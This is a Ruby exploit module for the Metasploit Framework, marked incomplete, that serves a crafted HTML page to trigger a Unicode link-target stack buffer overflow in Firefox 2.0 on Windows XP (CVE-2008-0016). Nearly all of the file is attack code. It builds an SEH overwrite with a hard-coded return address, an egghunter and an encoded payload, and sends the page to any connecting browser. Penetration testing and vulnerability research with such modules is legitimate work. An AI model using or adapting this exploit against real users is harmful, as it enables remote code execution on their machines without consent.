##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote

  #
  # This module acts as an HTTP server
  #
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::Remote::Egghunter

  def initialize(info = {})
    super(update_info(info,
      'Name'           => '[INCOMPLETE] Firefox 2.0.0.16 Unicode Link Target stack buffer overflow',
      'Description'    => %q{

      },
      'License'        => MSF_LICENSE,
      'Author'         => [
                  'Dominic Chell <dmc@deadbeef.co.uk>', # original exploit
                  'egypt',                              # Metasploit conversion
                ],
      'Version'        => '$Revision$',
      'References'     => 
        [
          ['CVE', '2008-0016'],
          ['MIL', '9663']
        ],
      'Payload'        =>
        {
          'Space'    => 1000,
          'BadChars' => "\x5d",
          'StackAdjustment' => -3500,
          'DisableNops' => true,
        },
      'Targets'        =>
        [
          [ 'Firefox 2.0.0.15 on Windows XP SP0-SP3', 
            {
              'Platform'   => 'win',
              'Arch'       => ARCH_X86,
              'Ret'        => 0x603711e7, # pop/pop/ret - xpcom_core.dll
            }
          ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Sep 25 2009'
      ))

  end

  def on_request_uri(cli, request)
    print_status("Sending #{self.name} to #{cli.peerhost}")
    # Re-generate the payload
    return if ((p = regenerate_payload(cli)) == nil)

    hunter = generate_egghunter()
    egg    = hunter[1]

    pattern = "\x90" * 3402
    pattern << "\xeb\x10\x90\x90"  # ptr to next seh
    pattern << [target.ret].pack("V")
    pattern << "\x90" * 10
    #pattern << "\xCC"
    #pattern << ((255.downto(0)).collect { |b| [b].pack("c") }).join
    pattern << hunter[0]
    pattern << "\xCC\xCC" * (5000 - pattern.length) 

    html = "<meta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\" />\n<html>\n<body>\n"
    html << "<!CDATA[" + egg + egg + payload.encoded + "]>\n"
    html << "<a href=\""
    html << "\x01"
    html << "xx://dmc"
    html << Rex::Text.to_unicode("\xc3\xba", "utf-8")
    html << "/"
    html << entity_encode(pattern)
    html << "\" >s</a>"
    html << "\n</body>"
    html << "\n</html>"
  
    print_line Rex::Text.to_hex_dump(payload.encoded)
  
    send_response_html(cli, html, { "Content-Type" => "text/html;charset=utf-8" })
  end

  def entity_encode(str)
    # make sure it's even length by padding with the last character
    (str.length % 4).times {
      str << str[str.length - 1]
    }
    enc = ""
    str.scan(/..../).each { |a|
      enc << sprintf("&#x%02x%02x;&#x%02x%02x;", a[1], a[0], a[3], a[2])
    }
    return enc
  end
end
